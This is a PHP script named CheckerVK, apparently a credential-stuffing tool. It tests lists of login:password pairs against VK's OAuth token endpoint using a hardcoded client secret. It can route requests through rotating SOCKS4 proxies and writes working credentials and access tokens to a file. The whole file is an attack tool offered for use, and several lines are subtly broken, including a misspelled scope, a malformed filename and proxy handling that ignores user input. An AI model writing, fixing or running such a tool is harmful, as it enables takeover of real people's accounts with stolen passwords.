<?php

echo "
#####################
CheckerVK by @axauo

Telegram: @axauo
Github: https://github.com/axauo/CheckerVK
#####################
";
echo "
********menu********
1) CheckerVK
2) Help
3) Update
";
$menu = readline("/menu/ > ");
switch ($menu) {
  case 1;
  
  $data = readline("menu/CheckerVK/ base::> ");
  $proxy = readline("menu/CheckerVK/ proxy::> ");

  $parsdata = explode("\n", file_get_contents($data));

  foreach ($parsdata as $db) {
    $datavk = explode(":", $db);
    
    $url = "https://api.vk.com/oauth/token";
    $array = array(
    "grant_type" => "password", 
    "client_id" => 2274003, 
    "scope" => "ofline", 
    "client_secret" => "hHbZxrka2uZ6jB1inYsH", 
    "username" => $datavk[0], 
    "password" => $datavk[1]
    );
    
    if(!empty($proxy)){
      $proxylist = explode("\n", file_get_contents("proxy.txt"));
      shuffle($proxylist);
      
      echo "connect - ".$proxylist[0]."..."; 
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $url."?".http_build_query($array));
      curl_setopt($ch, CURLOPT_TIMEOUT, 60);
      curl_setopt($ch, CURLOPT_PROXY, $proxylist[0]);
      curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, FALSE);
      $result = curl_exec($ch);
      curl_close($ch);
    
} else {
  
  $result = file_get_contents($url."?".http_build_query($array));
}

if(!empty($token=json_decode($result)->access_token)){
  
  $date = date("H:i:s");
  
  echo "[+] login:$datavk[0] password:$datavk[1] \n";
  $save = fopen("valid-".$date."txt", "w");
  fwrite($save, $datavk[0].":".$datavk[1].":".$token."\n");
  $save = fclose($save);
  
  } else {
    
    echo "[-] login:$datavk[0] password:$datavk[1] \n";
    }
  }
  break;
  
  case 2;
  
  echo "
  CheckerVK:
  - Base: (file/url) 
  - Proxy (file/url)
  - Format (login:password) 
  
  Example: menu/CheckerVK/ base::> goods.txt
           menu/CheckerVK/ proxy::> https://example.com/proxys.txt";
  
  break;
  
  case 3;
  
  system("git pull");
  
  break;
}
